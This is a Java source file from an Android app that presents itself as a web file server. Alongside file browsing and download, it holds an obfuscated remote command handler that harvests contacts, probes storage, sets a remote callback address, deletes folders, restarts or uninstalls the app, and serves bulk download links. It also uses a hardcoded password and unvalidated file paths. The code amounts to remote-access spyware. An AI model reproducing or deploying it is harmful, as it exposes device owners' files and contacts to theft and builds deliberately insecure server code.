package com.example.myapplication.src.main.java.com.nameless.web_server;

import static android.app.PendingIntent.getActivity;

import static com.example.myapplication.src.main.java.com.nameless.web_server.Page.context;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.fragment.app.FragmentActivity;
import androidx.fragment.app.FragmentManager;

import com.example.myapplication.MainActivity;
import com.example.myapplication.service;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.math.BigInteger;
import java.net.Socket;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Date;

/**
 * This program can be use for your home PC or server.
 * Web file server give you the ability to have permanent access to files on your computer.
 * The author of this program does not call for its use as malicious software.
 * Anyway the author does not bear any responsibility!
 *
 * @author Mikhailov Danil(midaef).
 */

/**
 * This class use for create session and token
 */

public class Session extends Thread {

	File locSrc = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
//	File locDst = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
	File locDst = MainActivity.getAppContext().getExternalFilesDirs(null)[0];
	File zppng  = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
	File locsv = locDst;
	private HashMap<String, String> users;
	private Page page = new Page();
	private String password;
	private Socket socket;
	private String ROOT_PATH = Page.gtass("resources/control.html");
	private Settings settings = new Settings();
	StringBuilder dbanrep = new StringBuilder();

	public Session(Socket socket, HashMap<String, String> users) throws IOException {
//		this.password = settings.getPassword();
		this.password = settings.getPassword();
		this.users = users;
		this.socket = socket;
		this.ROOT_PATH = settings.getPath();
	}

	@Override
	public void run() {
		try (BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
			String line = reader.readLine();
			String clientIP = getClientIP(socket);
			MainActivity.yyyw("http req - "+line);

			if (line != null) {
//				MainActivity.yyyw("TAG", "1");
				String token = createToken(clientIP, reader);
				if (line.contains("control.html") || settings.getKeyWebServer() == 0) {

//					MainActivity.yyyw("TAG", "2");
					if (settings.getKeyWebFileServer() == 1) {
//						MainActivity.yyyw("TAG", "3");
						Boolean isLogin = login(line, token);
						System.out.println(line);
						if (isLogin) {
//							MainActivity.yyyw("TAG", "4");
							line = line.split("\n")[0].replace(" HTTP/1.1", "");
							String request = parser(line);
							sendRequest(socket, request);
						} else sendRequest(socket, Page.gtass("resources/control.html"));
//						MainActivity.yyyw("TAG", "-4");
					} else {sendRequest(socket, page.createErrorPage());
//						MainActivity.yyyw("TAG", "-3");
					}
				}
				else if (line.substring(0,13).equals("GET /denaload")){
					String request = parser(line);
					sendRequest(socket, request);
				}
				else if (line.contains("errppo")){
					String request = parser(line);
					sendRequest(socket, request);
				}
				else if(line.contains("ggt")){
					String request = parser(line);
					request = request.replace("&href&",MainActivity.addrs);
					sendRequest(socket,request);
				}
				else if (settings.getKeyWebServer() == 1) {
//					MainActivity.yyyw("TAG", "-2");
					sendRequest(socket, Page.gtass("resources/control.html"));
				}
			}
//			MainActivity.yyyw("TAG", "-1");

		} catch (Exception e) {e.printStackTrace();
			MainActivity.yyyw(e+"");}
	}

	private String createToken(String clientIP, BufferedReader reader) {
		try {
			String userAgent = "";
			for (int i = 0; i < 7; i++) {
				userAgent = reader.readLine();
				if (userAgent.startsWith("User-Agent: ")) {
					break;
				}
			}
			userAgent = userAgent + clientIP;
			if (userAgent.startsWith("User-Agent: ")) {
				MessageDigest m = MessageDigest.getInstance("MD5");
				m.reset();
				m.update(userAgent.getBytes("utf-8"));
				String token = new BigInteger(1, m.digest()).toString(16);
				while (token.length() < 32) {
					token = "0" + token;
				}
				return token;
			}
		} catch (Exception e) {e.printStackTrace();
			MainActivity.yyyw(e+"");}
		return "";
	}

	private String getPasswordAndLogin(String line) {
		String req[] = line.split("=");
		String data = req[req.length-1].replace("/ HTTP/1.1", "");
		return data;
	}

	private Boolean login(String line, String token) {
		if (!users.containsKey(token)) {
			if (line.contains("entry=")) {
				String req = getPasswordAndLogin(line);
				if (req.split("/")[1].equals(password)) {
					users.put(token, req.split("/")[0]);
					return true;
				} else return false;
			} else return false;
		}
		return true;
	}

	private String getClientIP(Socket socket) {
		return socket.getInetAddress().toString();
	}

	private String parser(String line) throws IOException, InterruptedException {
		String directoryLink = "";
		if (line.contains("dir=") && line.contains("sd-[") && !line.contains("download=")) {
//			MainActivity.yyyw("loca", "1");
			String directoryName = splitRequest(line, "dir=");
//			MainActivity.yyyw("sd dir"+directoryName);
			try {
				directoryLink = page.getMainDir(directoryName,true);
			} catch (Exception e) {
				MainActivity.yyyw(e+"");
				return page.createErrorPage();
			}
			if (!page.getFormatFile(directoryName).isEmpty()) {
				return page.openFile(page.getFormatFile(directoryName), directoryLink);
			}
			String index = page.createIndexPage(directoryLink, false);
			return index.replace("&href&",MainActivity.addrs);
		}
		else if (line.substring(0,13).equals("GET /denaload")){
			String dbanpg = Page.gtass("resources/dnl.html");
			if (line.contains("arg=[")) {
				String iop = line.substring(line.indexOf("arg=[") + 5, line.indexOf("]=arg"));
				MainActivity.yyyw("ARG:  ", "\""+iop+"\"");
				line.replace(iop, "");
				return dban(iop);
			}
			if (dbanpg.contains("//&links&")&&dbanpg.contains("&value&")){
			}
			String qq = dbanpg.replace("//&links&", "").replace("&value&","1").replace("&href&",MainActivity.addrs);
			return qq;
		}
		else if (line.contains("errppo")) {
			if (line.contains("cerr")){
				MainActivity.yyyw("[clr]");
			}
			String dbanpg = Page.gtass("resources/err.html");
			if (dbanpg.contains("&result&")){
			}
			String qq = dbanpg.replace("&result&", "<br><td>" + MainActivity.logg.replace("\n","<br>") + "</td>"+ "<br>"+service.replyyy).replace("&href&",MainActivity.addrs);
			return qq;
		}
		else if (line.contains("dir=") && !line.contains("download=")) {
			MainActivity.yyyw("parser", "download"+line);
			String directoryName = splitRequest(line, "dir=");
			try {
				directoryLink = page.getMainDir(directoryName);
			} catch (Exception e) {
				MainActivity.yyyw(e+"");
				return page.createErrorPage();
			}
			if (!page.getFormatFile(directoryName).isEmpty()) {
				return page.openFile(page.getFormatFile(directoryName), directoryLink);
			}
			String index = page.createIndexPage(directoryLink, false);
			return index;
		}
		else if (line.contains("download=" )&& line.contains("sd-[")) {
//			MainActivity.yyyw("loca", "3");
			String filePath = splitRequest(line, "dir=").replace("download=", "")
					.replace("//", "");
			String path = page.getMainDir("",true) + "/" + filePath;
			page.clearDirectoryList();
			if (filePath.contains("/")) {
				String[] data = filePath.split("/");
				return path + "pp&jk" + data[data.length-1] + "pp&jk" + new File(path).length() + "&keyword=download";
			}
			return path + "pp&jk" + filePath + "pp&jk" + new File(path).length() + "&keyword=download";
		}
		else if (line.contains("download=")) {
//			MainActivity.yyyw("loca", "4");
			String filePath = splitRequest(line, "dir=").replace("download=", "")
					.replace("//", "");
			String path = page.getMainDir("") + "/" + filePath;
			page.clearDirectoryList();
			if (filePath.contains("/")) {
				String[] data = filePath.split("/");
				return path + "pp&jk" + data[data.length-1] + "pp&jk" + new File(path).length() + "&keyword=download";
			}
			return path + "pp&jk" + filePath + "pp&jk" + new File(path).length() + "&keyword=download";
		}
		else if (line.contains("ggt")){
//			MainActivity.yyyw("loca", "5");
			try{
				if (line.contains("arg=[")) {
					String iop = line.substring(line.indexOf("arg=[") + 5, line.indexOf("]=arg"));
					MainActivity.yyyw("ARG:  ", "\""+iop+"\"");
					line.replace(iop, "");
					System.out.println("==="+iop);
					return dban(iop).replace("&href&",MainActivity.addrs);
				}else {
					System.out.println("====");
					return crtdban("NO RESULT");
				}
			}catch (Exception e){
				MainActivity.yyyw(e+"");
//				MainActivity.yyyw("at arg");
				e.printStackTrace();
			}
			return crtdban("NO RESULT");
		}
		else if (line.contains("sd-[")){
//			MainActivity.yyyw("loca", "6");
			String directory = page.getMainDir("",true);
			return page.createIndexPage(directory, true);
		}
		else if (line.equals("GET /") || line.contains("entry")) {
//			MainActivity.yyyw("loca", "7");
			String directory = page.getMainDir("");
			return page.createIndexPage(directory, true);
		}
		else {
			return crtdban("NO RESULT");
		}
	}


	public String dban(String arg) throws IOException, InterruptedException {
		if (arg.equals("r")){  // ====================contact========================
			dbancmd.msg();
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("clr")){  //======================clear================================
			MainActivity.dbanrep = new StringBuilder();
			return crtdban(MainActivity.dbanrep+"");
		}
		else if(arg.contains("/addr") && arg.substring(0,5).equals("/addr")){
			MainActivity.addrs = "http://" +arg.substring(5);
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("info")){
			String packageName = MainActivity.getAppContext().getPackageName();
			dbancmd.gg(packageName);
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.equals("resetapp")) {
			try {
				Intent mStartActivity = new Intent(MainActivity.getAppContext() , MainActivity.class);
				int mPendingIntentId = 123456;
				PendingIntent mPendingIntent = PendingIntent.getActivity(MainActivity.getAppContext(), mPendingIntentId, mStartActivity, PendingIntent.FLAG_CANCEL_CURRENT);
				AlarmManager mgr = (AlarmManager) MainActivity.getAppContext().getSystemService(Context.ALARM_SERVICE);
				mgr.set(AlarmManager.RTC, System.currentTimeMillis() + 100, mPendingIntent);
				System.exit(0);
			}catch (Exception e){
				e.printStackTrace();
			}
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.equals("storage")) {
			File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);
			ArrayList<File> diskPartition = new ArrayList<>();
			if (fs.length > 1) {
				String y = String.valueOf(fs[1]);
				int first = y.indexOf("/");
				int second = y.indexOf("/", first + 1);
				int third = y.indexOf("/", second + 1);
				diskPartition.add(new File(y.substring(0, third)));
			}
			String y = String.valueOf(fs[0]);
			int first = y.indexOf("/");
			int second = y.indexOf("/", first + 1);
			int third = y.indexOf("/", second + 1);
			diskPartition.add(new File(y.substring(0, third)));

			for (int i = 0; i < diskPartition.size(); i++) {
				long totalCapacity = diskPartition.get(i).getTotalSpace();
				long freePartitionSpace = diskPartition.get(i).getFreeSpace();
				showMessage("storage \""+i+"\"\nS:- "+totalCapacity/ (1024*1024*1024) + " GB  "+" / "+freePartitionSpace/ (1024*1024*1024) + " GB   ");
			}


			showMessage("local dst  "+locDst+"\nlocal src  "+locSrc+"\nlocal save  "+locsv);
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("/ttt")) {

			File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);
			showMessage(Arrays.toString(fs).replace(",","<br>"));
			MainActivity.yyyw("/ttt", Arrays.toString(fs));
			// at index 0 you have the internal storage and at index 1 the real external...
			if (arg.length()>4) {
				File a = new File(arg.substring(5));
				if (a.exists()) {
					locsv = a;
				}
			}
			showMessage("arg "+arg);
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("!s")) {
			File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);

			if (arg.contains("1")){
				locSrc = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
				showMessage("source:- "+locSrc);
			}else if (arg.contains("2")){
				String y = String.valueOf(fs[1]);
				int first = y.indexOf("/");
				int second = y.indexOf("/", first + 1);
				int third = y.indexOf("/", second + 1);
				locSrc = new File(y.substring(0, third));
				showMessage("source:- "+locSrc);
			}
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.contains("!d")) {
			File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);
			if (arg.contains("1")){
				locDst = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/");
				showMessage("source:- "+locDst);
			}else if (arg.contains("2")){
				String y = String.valueOf(fs[1]);
				int first = y.indexOf("/");
				int second = y.indexOf("/", first + 1);
				int third = y.indexOf("/", second + 1);
				locDst = new File(y.substring(0, third));
				showMessage("source:- "+locDst);
			}
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.length()>8&&arg.contains("chunkpg") && arg.substring(0,7).equals("chunkpg")) {
			System.out.println("======"+arg.substring(7));
			StringBuilder er = MainActivity.htppg;
			int trgt = er.indexOf("[SPLIITT]"+arg.substring(7));
			System.out.println(trgt+"\n"+"[SPLIITT]"+arg.substring(7));
			String ert = er.substring(trgt,er.indexOf("[SPLIITT]"+String.format("%04d", (Integer.parseInt(arg.substring(7))+1))));

//			System.out.println(trgt+" , "+er.indexOf("[SPLIITT]"+String.format("%04d", (Integer.parseInt(arg.substring(7))+1)))+"+++++--"+ert);

			String fds = Page.gtass("resources/dnl.html");
			String lnks = addlnk(ert).replace("http://localhost",MainActivity.addrs);
			if (fds.contains("//&links&")){
				fds = fds.replace("//&links&",lnks);
			}
			if (fds.contains("&value&")){
				fds = fds.replace("&value&",Integer.parseInt(arg.substring(7))+"");
			}
			if (fds.contains("&result&")){
				fds = fds.replace("&result&",ert);
			}
//			if (fds.contains("&href&")){
//				fds = fds.replace("&href&",MainActivity.addrs);
//			}
			System.out.println(fds);
			return fds;
		}
		else if (arg.equals("ABORT")){ //ABORT
			try{
				File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);
				if (fs.length>1){
					for (File i : fs){

						String y = String.valueOf(i);
						int second = y.lastIndexOf("Android" );
						File lot = new File(y + "/MyFolder/dd/");
						File loc = new File(y.substring(0, second) + "MyFolder/dd/");
						MainActivity.yyyw("source:- "+lot.exists()+"  "+lot);
						MainActivity.yyyw("source OUT:- "+loc.exists()+"  "+loc);
						if (loc.exists()){
							deleteRecursive(loc);
							MainActivity.yyyw("------ "+loc+"  was deleted");
						}
						if (lot.exists()){
							deleteRecursive(lot);
							MainActivity.yyyw("------ "+lot+"  was deleted");
						}
					}
				}else {
					MainActivity.yyyw("fsNotFound- "+fs.length+Arrays.toString(fs));
				}
			}catch (Exception e){
				MainActivity.yyyw(e+"");
				showMessage("err - "+e);
			}
			return crtdban(MainActivity.dbanrep+"");
		}
		else if (arg.equals("!un")){
			Intent intent = new Intent(Intent.ACTION_DELETE);
			intent.setData(Uri.parse("package:"+MainActivity.getAppContext().getPackageName()));
//			startActivity(intent);
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			MainActivity.getAppContext().startActivity(intent);

			return crtdban(MainActivity.dbanrep+"");
		}
		else{   //========================dot=============================
			MainActivity.yyyw("rrrr", arg);
			try {
				service.locate(locSrc, locDst + "/MyFolder/Tree", arg, locsv);
			} catch (Exception e) {
				MainActivity.yyyw(e+"");
				showMessage("err was- "+e);
			}
			showMessage("arg "+arg);

			return crtdban(MainActivity.dbanrep+"");
		}
	}


	void deleteRecursive(File fileOrDirectory) {
		if (fileOrDirectory.isDirectory())
			for (File child : fileOrDirectory.listFiles())
				deleteRecursive(child);
		MainActivity.yyyw("R_Del", fileOrDirectory+"");
		fileOrDirectory.delete();
	}

	public String crtdban(String thang) throws IOException {
		String dbanpg = Page.gtass("resources/dban.html");
		return dbanpg.replace("&result&", "<br><td>" + thang + "</td>"+ "<br>"+service.replyyy).replace("&href&",MainActivity.addrs);
	}



	public static void showMessage(String msg) {
		String msgw;
		if (msg.contains("\n")) {
			msgw = msg.replace("\n", "<br>") + "<br>";
		} else {
			msgw = msg+"<br>";
		}
		MainActivity.dbanrep.append(msgw);
	}




















	private String splitRequest(String line, String type) {
		String[] request = line.split("\\?");
		MainActivity.yyyw("split"+ Arrays.toString(request));
		String directoryName = "";
		for (String str : request) {
				directoryName += "/" + str.replace(type, "").replace("GET /", "")
						.replace("%20", " ");

		}
		String[] data = {};
		if (directoryName.contains(password + "//")) {
			data = directoryName.split("//");
			MainActivity.yyyw("contain pass"+directoryName);
		}
		else if (data.length == 0) return directoryName;
		return data[data.length-1];
	}


	private void sendRequest(Socket socket, String req) {
		try {
			String httpResponse = "HTTP/1.1 200 OK\r\n";
			OutputStream outputStream = socket.getOutputStream();
			PrintStream ps = new PrintStream(outputStream);
			if (req.contains("keyword=download")) {
				String data[] = req.split("pp&jk");
				MainActivity.yyyw("data", "sendRequest: "+req);
//				byte[] fileInArray = getBytes(data[0]);
				ps.printf(httpResponse);
				ps.print("Content-Disposition: form-data; name=\"myFile\"; filename=\"" + data[1] + "\"\r\n");
				ps.printf("Content-Type: text/plain; charset=utf-8\r\n\r\n");
				File file = new File(data[0]);
				FileInputStream fis = new FileInputStream(file);
				BufferedInputStream bis = new BufferedInputStream(fis);

				DataInputStream dis = new DataInputStream(bis);

				DataOutputStream dos = new DataOutputStream(outputStream);

//				dos.writeUTF(file.getName());
//				dos.writeLong(file.length());

				byte[] mybytearray = new byte[4096];
				int read = dis.read(mybytearray);
				while (read != -1) {
					dos.write(mybytearray, 0, read);
					read = dis.read(mybytearray);
				}
				dos.flush();
//				outputStream.write(fileInArray);
//				fileInArray = getBytes("");
			} else {
				httpResponse+="\r\n" + req;
				socket.getOutputStream().write(httpResponse.getBytes("UTF-8"));
			}
		} catch (Exception e) {
			MainActivity.yyyw(e+"");e.printStackTrace();}
	}
	public static String addlnk(String a){
		a.split("\n");
		StringBuilder ooop = new StringBuilder();
		System.out.println("addlink lenth of file"+a.split("\n").length+"\n"+a);
		for (String i : a.split("\n")) {
			i = i.trim();
			if (new File(i).exists()) {
				System.out.println("exists"+i);
//				System.out.println(i.length() + i);
				String p = i.substring(20);
//				System.out.println(p);
				String d = p.substring(0, p.lastIndexOf("/")).replace("/", "?dir=") + p.substring(p.lastIndexOf("/")).replace("/", "?download=");
				ooop.append("window.open(\""+MainActivity.addrs+":9999/control.html?entry=NAMELESS_WEB_SERVER/123//" + d + "\");\n");
			}
		}
		return ooop.toString();
	}

}